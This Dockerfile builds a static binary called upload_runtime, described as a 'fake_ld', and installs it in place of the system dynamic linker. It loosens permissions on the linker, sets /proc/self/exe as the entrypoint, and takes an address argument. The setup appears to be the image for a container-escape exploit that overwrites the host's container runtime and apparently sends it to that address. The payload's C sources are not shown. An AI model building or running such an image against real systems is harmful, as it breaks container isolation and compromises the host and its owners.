FROM alpine:3.15 AS compile

RUN apk add --no-cache build-base

WORKDIR /root
COPY ["upload_runtime.c", "upload_runtime.h", "wait_for_exec.c", \
      "wait_for_exec.h", "consts.h", \
      "/root/"]

# Compile with musl-libc, as glibc's TLS panics.
# Compile as a static PIE so that that fake_ld is self-relocating.
RUN gcc -static-pie -s upload_runtime.c wait_for_exec.c -o /upload_runtime
RUN chmod ugo+rwx /upload_runtime

# -------------------------------- #

FROM ubuntu:18.04

RUN apt update && apt install --no-install-recommends -y curl && rm -rf /var/lib/apt/lists/*;

RUN ln -s /proc/self/exe /entrypoint

ARG PLATFORM_LD_PATH_ARG=/lib64/ld-linux-x86-64.so.2
ENV PLATFORM_LD_PATH=$PLATFORM_LD_PATH_ARG
RUN cp $PLATFORM_LD_PATH /root/ld_original
RUN chmod ugo+rwx /root/ld_original /root $PLATFORM_LD_PATH $(dirname $PLATFORM_LD_PATH)
COPY --from=compile /upload_runtime $PLATFORM_LD_PATH

# entrypoint links to /proc/self/exe
ENTRYPOINT ["/entrypoint"]
CMD ["127.0.0.1"] # default address
